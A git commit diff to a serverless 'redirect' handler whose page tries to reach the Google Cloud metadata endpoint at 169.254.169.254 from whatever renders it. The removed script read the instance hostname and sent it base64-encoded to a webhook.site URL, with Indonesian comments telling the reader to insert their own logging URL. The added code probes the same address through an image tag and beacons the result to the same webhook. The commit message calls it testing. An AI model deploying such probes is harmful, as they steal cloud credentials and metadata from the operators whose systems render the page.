19499c5015cb952508dba2bb32ba099e7ca3f1a2
Aditya <aditya52243@sma.belajar.id>
2026-02-20 18:36:57 +0700

    Refactor redirect handler for testing purposes
    Removed old script for fetching instance hostname and logging, added new testing header and image.

--- api/redirect.js
+++ api/redirect.js
@@ -1,27 +1,12 @@
 export default function handler(req, res) {
-  // Kita kirimkan halaman HTML, bukan redirect 307
   res.setHeader('Content-Type', 'text/html');
   res.status(200).send(`
     <html>
-      <head><title>Research Lab</title></head>
       <body>
-        <h1>Analyzing Perforance...</h1>
-        <script>
-          const target = "http://169.254.169.254/computeMetadata/v1/instance/hostname";
-          
-          fetch(target, {
-            headers: { "Metadata-Flavor": "Google" }
-          })
-          .then(response => response.text())
-          .then(data => {
-            // KIRIM DATA KE LOG ANDA
-            // Ganti URL ini dengan URL Webhook.site atau endpoint logger Vercel Anda
-            fetch("https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d?leak=" + btoa(data));
-          })
-          .catch(err => {
-            fetch("https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d?error=" + btoa(err.message));
-          });
-        </script>
+        <h1>Testing...</h1>
+        <img src="http://169.254.169.254/computeMetadata/v1/instance/hostname?v=${Date.now()}" 
+             onerror="fetch('https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d?status=HIT_BUT_ERROR');"
+             onload="fetch('https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d?status=IMAGE_LOADED');">
       </body>
     </html>
   `);
